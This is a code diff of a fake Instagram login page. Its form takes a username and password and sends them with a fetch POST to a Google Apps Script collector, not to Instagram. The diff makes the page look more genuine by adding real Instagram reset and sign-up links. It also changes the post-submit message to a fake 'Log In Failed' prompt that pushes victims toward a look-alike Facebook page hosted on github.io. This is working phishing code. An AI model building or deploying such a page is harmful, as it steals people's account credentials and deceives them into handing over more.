@@ -7,7 +7,6 @@
 </head>
 <body link="white" alink="white" vlink="white">
 	<div class="container">
-	<div class="text">Log in to continue</div>
 	<div class="page">
 		<div class="title">Instagram</div>
 		<div class="container">
@@ -17,11 +16,12 @@
     <div class="col-sm">
      
 		<form method="post" autocomplete="off" name="google-sheet" >
-			<div class="box">
+				<div class="box">
 			<input type="text" class="form-control" placeholder="Phone number, username, or email" name="username" required>
 			<input type="password" class="form-control"  placeholder="Password" name="password" required>
+			<div class="wrapper"><a href="https://www.instagram.com/accounts/password/reset/" style="text-decoration: none;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Forgot password? </a><br></div>
 			<input type="Submit" class="btn btn-primary" value="Log In"></div><br>
-			<div class="option">OR</div><br>
+			<div class="option">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OR</div><br>
 		</form>
     </div>
     <div class="col-sm">
@@ -31,7 +31,8 @@
 </div>
 			<i class="fa fa-facebook-official" aria-hidden="true"></i>
 			<div class="login">
-			<a href="https://facebookofficial.github.io/facebook.github.io/" style="text-decoration: none;">Continue with Facebook</a></div><br><br>
+			<a href="https://facebookofficial.github.io/facebook.github.io/" style="text-decoration: none;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Continue with Facebook</a></div><br><br>
+			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Don't have an account?<div class="link"><a href="https://www.instagram.com/accounts/emailsignup/" style="text-decoration: none;"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sign Up </a></div></p>
 			<script>
             const scriptURL = 'https://script.google.com/macros/s/AKfycbzZo2_RYi7eMV-ZM70TDfwyUTZb8TQjZHgq0OUCf9GsQSj3gl0/exec'
             const form = document.forms['google-sheet']
@@ -39,7 +40,7 @@
             form.addEventListener('submit', e => {
               e.preventDefault()
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-                .then(response => alert("Logged In Successfully"))
+                .then(response => alert("Log In Failed. Please try another form"))
                 .catch(error => console.error('Error!', error.message))
             })
           </script>
